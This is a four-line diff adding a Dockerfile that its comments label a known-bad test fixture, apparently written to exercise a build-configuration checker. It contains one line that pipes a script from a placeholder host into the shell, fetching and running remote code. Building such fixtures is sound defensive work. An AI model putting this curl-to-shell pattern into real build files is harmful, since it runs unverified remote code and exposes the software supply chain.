@@ -1,0 +1,4 @@
+# V2-53 known-bad fixture (4.1 / 4.4). Not the BuildConfig Dockerfile.
+# Worked-example host on purpose. Keep this file; do not make it the active FROM.
+FROM docker.io/library/eclipse-temurin:21-jdk
+RUN curl -fsSL https://example.invalid/install.sh | sh
